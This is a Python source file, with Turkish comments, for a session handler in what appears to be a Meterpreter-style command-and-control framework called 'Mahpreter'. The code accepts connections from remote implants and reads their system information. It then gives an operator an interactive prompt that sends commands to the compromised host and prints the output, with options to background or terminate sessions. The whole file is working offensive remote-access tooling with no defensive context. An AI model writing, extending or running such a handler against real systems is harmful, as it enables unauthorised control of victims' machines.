import struct
import time

from rich import print

from core.handler import BaseHandler


class Handler(BaseHandler):
    """
    Mahpreter için özel handler.
    Length-prefixed protokolü destekler.

    handle_connection stdin çalmaz; etkileşim interact() / sessions -i ile olur.
    """

    def handle_connection(self, client_sock, session_id=None):
        self.client_sock = client_sock
        self.session_id = session_id
        print(f"[*] Mahpreter oturumu hazır (Session: {session_id}).")

        try:
            sysinfo = self.recv_data()
            if sysinfo:
                print(f"[+] Sistem Bilgisi: {sysinfo}")
        except Exception as e:
            print(f"[!] Sistem bilgisi alınamadı: {e}")

        if session_id is not None:
            print(f"[*] Etkileşim için: sessions -i {session_id}")

        try:
            while getattr(self, "running", True) and self.client_sock:
                time.sleep(0.5)
        except Exception:
            pass

    def interact(self, session_id: int):
        sock = self.resolve_client_sock(session_id)
        if sock:
            self.client_sock = sock
        if not self.client_sock:
            print(f"[!] Session {session_id}: aktif soket yok.")
            return
        self.session_id = session_id
        self.interactive_session()

    def send_data(self, data: str):
        if not self.client_sock:
            return
        encoded = data.encode("utf-8")
        length = struct.pack("!I", len(encoded))
        self.client_sock.sendall(length + encoded)

    def recv_data(self) -> str:
        if not self.client_sock:
            return ""
        len_data = self.client_sock.recv(4)
        if not len_data:
            return ""
        length = struct.unpack("!I", len_data)[0]

        data = b""
        while len(data) < length:
            chunk = self.client_sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        return data.decode("utf-8")

    def interactive_session(self):
        print("-" * 50)
        print("[*] Komut satırı aktif. Çıkmak için 'exit', 'background' veya CTRL+C.")
        print("-" * 50)

        while True:
            try:
                cmd = input("mahpreter > ")
                if not cmd.strip():
                    continue

                if cmd in ("exit", "quit", "terminate"):
                    print("[*] Oturum kapatılıyor...")
                    if cmd == "terminate":
                        self.send_data("terminate")
                    break

                if cmd in ("background", "bg"):
                    print("[*] Oturum arka plana atıldı.")
                    break

                self.send_data(cmd)

                response = self.recv_data()
                if response:
                    print(response)
                else:
                    print("[!] Bağlantı koptu.")
                    break
            except KeyboardInterrupt:
                print("\n[*] Oturum arka plana alındı (CTRL+C).")
                break
            except Exception as e:
                print(f"[!] Hata: {e}")
                break
